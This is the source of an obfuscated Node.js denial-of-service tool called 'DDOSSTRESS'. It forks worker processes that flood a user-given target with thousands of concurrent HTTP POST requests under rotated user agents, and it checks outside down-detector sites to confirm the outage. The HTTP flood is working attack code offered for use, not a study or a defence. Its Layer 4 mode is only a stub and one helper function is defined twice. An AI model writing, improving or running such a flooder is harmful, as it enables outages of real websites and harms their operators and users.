import _0xd838fc from 'node:cluster';
import _0xaef17 from 'chalk';
import { URL } from 'url';
import { createRequire } from 'module';
import _0x3f91de from 'net';
import _0x4863b3 from 'http';
import _0x3c4361 from 'https';
import _0x41645b from 'fs';
import _0x3c116f from 'figlet';
import _0x284721 from 'gradient-string';
import 'axios';
import _0x1721ef from 'http2';
import 'tls';
const require = createRequire(import.meta.url);
let raw;
try {
  raw = require('raw-socket');
} catch {}
const userAgents = _0x41645b.readFileSync('./useragents.txt', 'utf-8').split("\n").filter(_0x2576f6 => _0x2576f6.trim().length > 0x0);
function randomUA() {
  return userAgents[Math.floor(Math.random() * userAgents.length)] || "Mozilla/5.0";
}
if (process.argv.length < 0x7) {
  console.log(_0xaef17.red("Usage: node ddosstress2.js <target> <threads> <duration_sec> --layer <layer4|layer7>"));
  process.exit(0x1);
}
const targetStr = process.argv[0x2];
const concurrency = parseInt(process.argv[0x3], 0xa) || 0x5;
const durationSec = parseInt(process.argv[0x4], 0xa) || 0x3c;
const duration = durationSec * 0x3e8;
const layerFlag = process.argv[0x6].toLowerCase() || "layer7";
let urlObj;
let hostname;
let port;
let protocol;
try {
  if (/^https?:\/\//i.test(targetStr)) {
    urlObj = new URL(targetStr);
    hostname = urlObj.hostname;
    protocol = urlObj.protocol;
    port = urlObj.port ? parseInt(urlObj.port, 0xa) : protocol === "https:" ? 0x1bb : 0x50;
  } else {
    protocol = "http:";
    hostname = targetStr;
    port = 0x50;
    urlObj = new URL(protocol + '//' + hostname + ':' + port);
  }
} catch {
  console.log(_0xaef17.red("Invalid target"));
  process.exit(0x1);
}
async function checkPort(_0x2ed18b, _0x53ae91) {
  return new Promise(_0x141443 => {
    const _0x3c2463 = _0x3f91de.createConnection({
      'host': _0x2ed18b,
      'port': _0x53ae91,
      'timeout': 0x7d0
    }, () => {
      _0x3c2463.destroy();
      _0x141443(true);
    });
    _0x3c2463.on("error", () => _0x141443(false));
    _0x3c2463.on('timeout', () => {
      _0x3c2463.destroy();
      _0x141443(false);
    });
  });
}
console.log(_0xaef17.green.bold("=================================================="));
function printBanner() {
  try {
    console.log(_0x284721.pastel.multiline(_0x3c116f.textSync('DDOSSTRESS', {
      'horizontalLayout': "default"
    })));
  } catch {
    console.log(_0xaef17.green.bold('=================================================='));
    console.log(_0xaef17.bold("__  __                  __  __          _                 \n|  \\/  | ___  __ _  __ _|  \\/  | ___  __| |_   _ ___  __ _ \n| |\\/| |/ _ \\/ _` |/ _` | |\\/| |/ _ \\/ _` | | | / __|/ _` |\n| |  | |  __/ (_| | (_| | |  | |  __/ (_| | |_| \\__ \\ (_| |\n|_|  |_|\\___|\\__, |\\__,_|_|  |_|\\___|\\__,_|\\__,_|___/\\__,_|\n              |___/                                         "));
  }
  console.log(_0xaef17.gray("                              v3.3\n"));
  console.log(_0xaef17.red("-> ") + _0xaef17.yellow("Target     ") + "📌 " + _0xaef17.green(urlObj.href));
  console.log(_0xaef17.red("-> ") + _0xaef17.yellow("Threads    ") + "🧵 " + _0xaef17.blue(concurrency));
  console.log(_0xaef17.red("-> ") + _0xaef17.yellow("Duration   ") + "⏱ " + _0xaef17.green(durationSec + 's'));
  console.log(_0xaef17.red("-> ") + _0xaef17.yellow("Layer      ") + "🌐 " + _0xaef17.magenta(layerFlag));
  console.log("[31m-> [0mGithub[33m 🗂 : [32mhttps://github.com/chainner190");
  console.log("[31m-> [0mCheck-Host[33m 🗂 :  [32mhttps://check-host.net/check-http?host=" + process.argv[0x2]);
  console.log(_0xaef17.green.bold("=================================================="));
}
if (_0xd838fc.isPrimary) {
  (async () => {
    await checkWebsiteStatus(hostname);
    await checkSifat();
    await checkValidator(hostname);
    await checkDownRightNow(hostname);
    await checkValidatorDetailed(urlObj.href);
    const _0x2bfc09 = await checkPort(hostname, port);
    printBanner();
    console.log(_0xaef17.yellow("Port state : " + (_0x2bfc09 ? _0xaef17.green("OPEN") : _0xaef17.red("CLOSED"))));
    for (let _0x18396f = 0x1; _0x18396f <= concurrency; _0x18396f++) {
      await new Promise(_0x38e981 => {
        const _0x3adc69 = _0xd838fc.fork({
          'WORKER_ID': _0x18396f,
          'URL': urlObj.href,
          'LAYER': layerFlag,
          'DURATION': duration
        });
        _0x3adc69.once("online", () => _0x38e981());
      });
    }
    setTimeout(() => {
      console.log(_0xaef17.red.bold("\n[ DDOSSTRESS ] Time is up, stopping all engines..."));
      for (const _0x4b93e9 in _0xd838fc.workers) _0xd838fc.workers[_0x4b93e9].kill();
      process.exit(0x0);
    }, duration);
    _0xd838fc.on('exit', _0x57f765 => {
      const _0x37766f = _0x57f765?.["process"]?.['env']?.["WORKER_ID"] || _0x57f765.id;
      console.log(_0xaef17.yellow("[ DDOSSTRESS ] -> Engine " + _0x37766f + " exited"));
    });
  })();
} else {
  const wid = parseInt(process.env.WORKER_ID, 0xa);
  const layer = process.env.LAYER;
  const targetUrl = new URL(process.env.URL);
  console.log(_0xaef17.green("[ DDOSSTRESS ] -> Thread " + wid + " Started"));
  if (layer === "layer4") {
    mainWorkerLayer4(wid, targetUrl.hostname, targetUrl.port);
  } else {
    mainWorkerLayer7(wid, targetUrl);
  }
}
async function checkWebsiteStatus(_0x3096d7) {
  return new Promise(_0x3e4996 => {
    const _0x1dbf47 = "domain=" + encodeURIComponent(_0x3096d7);
    const _0x48edb0 = {
      'hostname': "isitdown.me",
      'path': "/check_domain.php",
      'method': "POST",
      'headers': {
        'Content-Type': "application/x-www-form-urlencoded",
        'Content-Length': Buffer.byteLength(_0x1dbf47),
        'User-Agent': "Mozilla/5.0"
      }
    };
    const _0x414c74 = _0x3c4361.request(_0x48edb0, _0x402eb4 => {
      _0x402eb4.on('end', () => {
        console.log(_0xaef17.green("[ DDOSSTRESS ] -> (isitdown.me for " + _0x3096d7 + ") (" + _0x402eb4.statusCode + ')'));
        _0x3e4996(_0x402eb4.statusCode);
      });
      _0x402eb4.resume();
    });
    _0x414c74.on("error", _0x34fa35 => {
      console.log(_0xaef17.red("[ DDOSSTRESS ] -> (isitdown.me) Error: " + (_0x34fa35.code || "ERR")));
      _0x3e4996(null);
    });
    _0x414c74.write(_0x1dbf47);
    _0x414c74.end();
  });
}
async function checkSifat() {
  return new Promise(_0x4c736d => {
    _0x3c4361.get("https://sifat.org/xmlrpc.php", _0x4fd38e => {
      console.log(_0xaef17.yellow("[ DDOSSTRESS ] -> (sifat.org/xmlrpc.php) (" + _0x4fd38e.statusCode + ')'));
      _0x4fd38e.resume();
      _0x4c736d(_0x4fd38e.statusCode);
    }).on("error", _0x14ec4a => {
      console.log(_0xaef17.red("[ DDOSSTRESS ] -> (sifat.org/xmlrpc.php) Error: " + (_0x14ec4a.code || "ERR")));
      _0x4c736d(null);
    });
  });
}
async function checkValidator(_0x2678aa) {
  return new Promise(_0x4b130d => {
    const _0x5d2ba6 = 'https://validator.w3.org/checklink?uri=' + encodeURIComponent(_0x2678aa);
    _0x3c4361.get(_0x5d2ba6, _0x47819c => {
      console.log(_0xaef17.cyan("[ DDOSSTRESS ] -> (validator.w3.org/checklink) (" + _0x47819c.statusCode + ')'));
      _0x47819c.resume();
      _0x4b130d(_0x47819c.statusCode);
    }).on('error', _0x4a1534 => {
      console.log(_0xaef17.red("[ DDOSSTRESS ] -> (validator.w3.org/checklink) Error: " + (_0x4a1534.code || "ERR")));
      _0x4b130d(null);
    });
  });
}
async function checkDownRightNow(_0x269716) {
  return new Promise(_0x47f9c1 => {
    const _0x133363 = "https://www.isitdownrightnow.com/check.php?domain=" + encodeURIComponent(_0x269716);
    _0x3c4361.get(_0x133363, _0x4927c4 => {
      console.log(_0xaef17.green("[ DDOSSTRESS ] -> (isitdownrightnow.com for " + _0x269716 + ") (" + _0x4927c4.statusCode + ')'));
      _0x4927c4.resume();
      _0x47f9c1(_0x4927c4.statusCode);
    }).on("error", _0x210dc3 => {
      console.log(_0xaef17.red("[ DDOSSTRESS ] -> (isitdownrightnow.com) Error: " + (_0x210dc3.code || "ERR")));
      _0x47f9c1(null);
    });
  });
}
async function checkValidatorDetailed(_0x234331) {
  return new Promise(_0x3cca59 => {
    const _0x125531 = "https://validator.w3.org/check?uri=" + encodeURIComponent(_0x234331) + "&charset=%28detect+automatically%29&doctype=Inline&group=0&verbose=1";
    _0x3c4361.get(_0x125531, _0x33f52b => {
      console.log(_0xaef17.blue("[ DDOSSTRESS ] -> (validator.w3.org/check) (" + _0x33f52b.statusCode + ')'));
      _0x33f52b.resume();
      _0x3cca59(_0x33f52b.statusCode);
    }).on('error', _0x14f419 => {
      console.log(_0xaef17.red("[ DDOSSTRESS ] -> (validator.w3.org/check) Error: " + (_0x14f419.code || "ERR")));
      _0x3cca59(null);
    });
  });
}
const errorStats = {};
function collectError(_0x5cb427, _0x41c02f) {
  const _0x4105c3 = _0x5cb427 + '|' + _0x41c02f;
  errorStats[_0x4105c3] = (errorStats[_0x4105c3] || 0x0) + 0x1;
}
setInterval(() => {
  for (const _0x4e6410 of Object.keys(errorStats)) {
    const [_0x4ab627, _0x244e7a] = _0x4e6410.split('|');
    console.log(_0xaef17.red("[ DDOSSTRESS ] -> (" + _0x4ab627 + ") Error: " + _0x244e7a + " [x" + errorStats[_0x4e6410] + ']'));
  }
  for (const _0x5d065c in errorStats) delete errorStats[_0x5d065c];
}, 0x7530);
function sendHttp2(_0x4a191b, _0xc16573) {
  const _0x4644bf = _0x1721ef.connect(_0x4a191b);
  const _0x430c56 = _0x4644bf.request(_0xc16573);
  _0x430c56.on('response', _0x420b4c => {
    console.log("[INFO] Response headers:", _0x420b4c);
  });
  _0x430c56.on("end", () => {
    _0x4644bf.close();
  });
  _0x430c56.end();
}
const lastStatus = {};
async function mainWorkerLayer7(_0x53c2d3, _0x83f965) {
  let _0xfb4d13 = 0x1;
  const _0x1c0a7f = _0x83f965.protocol === 'https:' ? _0x3c4361 : _0x4863b3;
  const _0x6cf737 = new _0x1c0a7f.Agent({
    'keepAlive': true,
    'maxSockets': 0x4e20
  });
  const _0x380d5e = _0x83f965.hostname;
  const _0x2e24d7 = Date.now() + duration;
  const _0x4c1f16 = [JSON.stringify({
    'stress': "ddosstress-engine",
    'ts': Date.now()
  }), JSON.stringify({
    'type': "flood",
    'power': "max",
    'worker': _0x53c2d3
  }), JSON.stringify({
    'attack': true,
    'random': Math.random(),
    'uid': Date.now()
  }), JSON.stringify({
    'method': 'POST',
    'layer': '7',
    'ua': userAgents[Math.floor(Math.random() * userAgents.length)] || "Mozilla/5.0"
  }), JSON.stringify({
    'ping': "pong",
    'thread': _0x53c2d3,
    'time': new Date().toISOString()
  })];
  function _0x469c98(_0x53796d, _0x57e651) {
    const _0x49b93e = ['text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', "application/json, text/plain, */*", "image/avif,image/webp,image/apng,*/*;q=0.8"];
    const _0x5080fe = ["gzip, deflate, br", "gzip, deflate", 'identity'];
    const _0x21da39 = ["en-US,en;q=0.9", "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"];
    const _0x3460b3 = ["no-cache", "no-store", "max-age=0", 'max-age=604800', "public", 'private', "must-revalidate"];
    const _0x3f9256 = _0x53796d.path + _0x57e651[Math.floor(Math.random() * _0x57e651.length)] + '?' + Math.random().toString(0x24).substring(0x2, 0xc);
    return {
      ':method': "GET",
      ':authority': _0x53796d.host,
      ':path': _0x3f9256,
      ':scheme': "https",
      'accept': _0x49b93e[Math.floor(Math.random() * _0x49b93e.length)],
      'accept-language': _0x21da39[Math.floor(Math.random() * _0x21da39.length)],
      'accept-encoding': _0x5080fe[Math.floor(Math.random() * _0x5080fe.length)],
      'cache-control': _0x3460b3[Math.floor(Math.random() * _0x3460b3.length)],
      'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
      'connection': "keep-alive",
      'sec-fetch-mode': "navigate",
      'sec-fetch-dest': "document",
      'sec-fetch-site': "none"
    };
  }
  function _0x1bac77(_0x2f3f91) {
    let _0x2fc7b9 = '';
    for (let _0x15e0ad = 0x0; _0x15e0ad < _0x2f3f91; _0x15e0ad++) {
      _0x2fc7b9 += "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * "abcdefghijklmnopqrstuvwxyz0123456789".length)];
    }
    return _0x2fc7b9;
  }
  function _0x469c98(_0x282db3) {
    if (Math.random() > 0.5) {
      const _0x3ac60a = "{\"id\":\"" + _0x1bac77(0x6) + "\",\"key\":\"" + _0x1bac77(0xc) + "\",\"ping\":" + Date.now() % 0x3e8 + ",\"flag\":" + (Math.random() > 0.5 ? 0x1 : 0x0) + '}';
      return {
        'url': _0x282db3 + ("?id=" + _0x1bac77(0x4) + '&k=' + _0x1bac77(0x6) + "&t=" + Date.now() % 0x3e8),
        'options': {
          'method': 'POST',
          'headers': {
            'User-Agent': "StressTest/1.0",
            'Content-Type': "application/json",
            'Content-Length': Buffer.byteLength(_0x3ac60a)
          }
        },
        'body': _0x3ac60a
      };
    } else {
      return {
        'url': _0x282db3 + ("?id=" + _0x1bac77(0x4) + '&k=' + _0x1bac77(0x6) + "&t=" + Date.now() % 0x3e8),
        'options': {
          'method': 'GET',
          'headers': {
            'User-Agent': "StressTest/1.0",
            'Accept': "*/*",
            'Connection': "keep-alive"
          }
        },
        'body': null
      };
    }
  }
  while (_0xfb4d13 < 0x989680 && Date.now() < _0x2e24d7) {
    const _0x594c43 = [];
    for (let _0x2c4725 = 0x0; _0x2c4725 < 0xbb8; _0x2c4725++) {
      _0x594c43.push(new Promise(_0x3ff3a4 => {
        const _0xa47af2 = _0x4c1f16[Math.floor(Math.random() * _0x4c1f16.length)];
        const _0x3a8f43 = {
          'method': "POST",
          'agent': _0x6cf737,
          'headers': {
            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)] || "Mozilla/5.0",
            'Content-Type': "application/json",
            'Content-Length': Buffer.byteLength(_0xa47af2)
          }
        };
        const _0x15fe47 = _0x1c0a7f.request(_0x83f965, _0x3a8f43, _0x2ff479 => {
          _0xfb4d13++;
          const _0x3af294 = _0x2ff479.statusCode;
          if (lastStatus[_0x380d5e] !== _0x3af294) {
            const _0x5e89f3 = _0x3af294 === 0xc8 ? _0xaef17.green : _0xaef17.red;
            console.log(_0x5e89f3("[DDOSSTRESS] -> (" + _0x380d5e + ") (" + _0x3af294 + ')'));
            lastStatus[_0x380d5e] = _0x3af294;
          }
          _0x2ff479.resume();
          _0x3ff3a4();
        });
        _0x15fe47.on("error", _0x3d0c93 => {
          const _0x36c4e3 = _0x3d0c93.code || "Connection error";
          if (lastStatus[_0x380d5e] !== _0x36c4e3) {
            console.log(_0xaef17.red("[DDOSSTRESS] -> (" + _0x380d5e + ") " + _0x36c4e3));
            lastStatus[_0x380d5e] = _0x36c4e3;
          }
          _0x3ff3a4();
        });
        _0x15fe47.write(_0xa47af2);
        _0x15fe47.end();
      }));
    }
    await Promise.all(_0x594c43);
  }
  if (_0xd838fc.isWorker) {
    process.exit(0x0);
  }
}
function mainWorkerLayer4(_0xafff41, _0x3ac610, _0x31b651) {
  console.log(_0xaef17.yellow("[ DDOSSTRESS ] -> Engine " + _0xafff41 + " running Layer4 on " + _0x3ac610 + ':' + _0x31b651));
}
